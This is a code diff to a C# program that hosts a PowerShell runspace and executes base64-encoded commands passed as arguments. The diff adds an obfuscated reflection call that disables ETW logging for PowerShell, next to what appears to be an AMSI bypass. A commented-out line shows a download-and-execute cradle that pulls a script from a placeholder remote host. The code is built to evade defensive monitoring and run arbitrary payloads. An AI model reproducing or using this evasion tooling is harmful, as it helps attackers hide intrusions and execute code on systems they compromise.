@@ -17,7 +17,6 @@ namespace TestExe
                 Console.WriteLine("[-] You need input some commands.");
                 return;
             }
-
             Runspace mySpace = RunspaceFactory.CreateRunspace();
             mySpace.Open();
             try
@@ -29,12 +28,22 @@ namespace TestExe
                 Console.WriteLine("[-] Maybe you needn't bypass.");
             }
 
+            try
+            {
+                mySpace.GetType().Assembly.GetType("System.Mana" + "gement.Au" + "tomation.Tr" + "acing.PSEtw" + "LogProvider").GetField("etwPro" + "vider", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid()));
+            }
+            catch
+            {
+                Console.WriteLine("[-] Maybe you needn't bypass ETW.");
+            }
+
             Pipeline myPipeLine = mySpace.CreatePipeline();
 
-            try {
+            try
+            {
                 myPipeLine.Commands.AddScript(Encoding.UTF8.GetString(Convert.FromBase64String(args[0])));
                 //myPipeLine.Commands.AddScript("IEX ((new-object net.webclient).downloadstring('http://ip:port/a'))");
-                Collection<PSObject>  outputs = myPipeLine.Invoke();
+                Collection<PSObject> outputs = myPipeLine.Invoke();
                 System.Text.StringBuilder sb = new StringBuilder();
                 foreach (PSObject pobject in outputs)
                 {
@@ -44,7 +53,8 @@ namespace TestExe
                 }
                 Console.WriteLine(sb.ToString());
             }
-            catch{
+            catch
+            {
                 Console.WriteLine("[-] something wrong with commands.");
             }
 
